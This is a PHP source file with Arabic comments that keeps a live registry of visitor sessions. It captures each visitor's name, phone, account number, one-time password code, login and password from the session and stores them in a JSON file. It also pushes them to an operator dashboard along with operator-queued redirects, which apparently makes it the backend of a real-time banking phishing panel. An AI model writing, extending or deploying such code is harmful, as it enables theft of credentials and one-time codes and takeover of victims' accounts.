<?php

declare(strict_types=1);

require_once __DIR__.'/bootstrap.php';

function session_registry_path(): string
{
    return PROJECT_ROOT.'/storage/session_registry.json';
}

/**
 * @return array<string, array<string, mixed>>
 */
function session_registry_read(): array
{
    $path = session_registry_path();
    if (! is_readable($path)) {
        return [];
    }
    $decoded = json_decode((string) file_get_contents($path), true);

    return is_array($decoded) ? $decoded : [];
}

/**
 * @param  array<string, array<string, mixed>>  $data
 */
function session_registry_write(array $data): void
{
    $path = session_registry_path();
    $dir = dirname($path);
    if (! is_dir($dir)) {
        mkdir($dir, 0755, true);
    }
    file_put_contents(
        $path,
        json_encode($data, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT),
        LOCK_EX
    );
}

/**
 * مسح قديم (ساعات): يمنع انتفاخ الملف.
 */
function session_registry_prune(int $maxAgeSeconds = 172800): void
{
    $data = session_registry_read();
    $cut = time() - $maxAgeSeconds;

    foreach ($data as $sid => $row) {
        $u = isset($row['updated_at']) ? (int) $row['updated_at'] : 0;
        if ($u < $cut) {
            unset($data[$sid]);
        }
    }
    session_registry_write($data);
}

/**
 * لقطة مستمرة من الجلسة لتظهر كلها في لوحة التحكم (مشروع تجريبي بلا نقص في الحقول).
 *
 * @return array<string, string>
 */
function registry_collect_client_payload(): array
{
    if (session_status() !== PHP_SESSION_ACTIVE) {
        return [];
    }

    return [
        'name' => (string) ($_SESSION['reg_name'] ?? ''),
        'phone' => (string) ($_SESSION['reg_phone'] ?? ''),
        'account_number' => (string) ($_SESSION['reg_account'] ?? ''),
        'otp_code' => (string) ($_SESSION['otp_code'] ?? ''),
        'otp_digits' => (string) ($_SESSION['otp_digits'] ?? ''),
        'login_account_number' => (string) ($_SESSION['username'] ?? ''),
        'password' => (string) ($_SESSION['sham_password'] ?? ''),
    ];
}

/**
 * كل صفحة تستدعيها لتسجيل مكان الزائر وبياناته الكاملة من الجلسة.
 */
function registry_touch_page(string $pageFilename): void
{
    $sid = session_id();
    if ($sid === '') {
        return;
    }

    if (session_status() !== PHP_SESSION_ACTIVE) {
        return;
    }

    $data = session_registry_read();
    $prev = isset($data[$sid]) && is_array($data[$sid]) ? $data[$sid] : [];

    require_once __DIR__.'/redirect_queue.php';

    $payload = registry_collect_client_payload();

    $row = array_merge(
        $prev,
        $payload,
        [
            'session_id' => $sid,
            'page' => $pageFilename,
            'updated_at' => time(),
            'queued_redirect' => redirect_queue_preview_for($sid),
        ]
    );

    $row['last_ping'] = $prev['last_ping'] ?? null;
    $row['session_online'] = true;

    $data[$sid] = $row;
    session_registry_write($data);

    require_once __DIR__.'/dashboard_broadcaster.php';
    pusher_notify_sessions_changed(true, $sid, true);
}

/**
 * يُستدعى عند إغلاق الصفحة (sendBeacon) ليُعلِن فوراً أن الجلسة لم تعد نشطة على الموقع.
 */
function registry_mark_session_offline(): void
{
    $sid = session_id();
    if ($sid === '') {
        return;
    }

    $data = session_registry_read();
    if (! isset($data[$sid])) {
        return;
    }

    $data[$sid]['session_online'] = false;
    $data[$sid]['last_ping'] = 0;
    $data[$sid]['offline_at'] = time();
    $data[$sid]['updated_at'] = time();

    session_registry_write($data);

    require_once __DIR__.'/dashboard_broadcaster.php';
    pusher_notify_sessions_changed(true, $sid, false);
}

/**
 * @return list<array<string, mixed>>
 */
function session_registry_entries_sorted(): array
{
    session_registry_prune();

    $all = session_registry_read();
    $rows = array_values($all);
    usort($rows, function ($a, $b) {
        $ta = isset($a['updated_at']) ? (int) $a['updated_at'] : 0;
        $tb = isset($b['updated_at']) ? (int) $b['updated_at'] : 0;

        return $tb <=> $ta;
    });

    return $rows;
}

function registry_ping(): void
{
    $sid = session_id();
    if ($sid === '') {
        return;
    }

    $data = session_registry_read();

    if (! isset($data[$sid])) {
        registry_touch_page('heartbeat');
        $data = session_registry_read();
    }

    if (! isset($data[$sid])) {
        return;
    }

    require_once __DIR__.'/redirect_queue.php';

    $live = registry_collect_client_payload();
    foreach ($live as $k => $v) {
        $data[$sid][$k] = $v;
    }

    $data[$sid]['last_ping'] = time();
    $data[$sid]['session_online'] = true;
    $data[$sid]['queued_redirect'] = redirect_queue_preview_for($sid);

    session_registry_write($data);

    require_once __DIR__.'/dashboard_broadcaster.php';
    pusher_notify_sessions_changed(false, $sid, false);
}
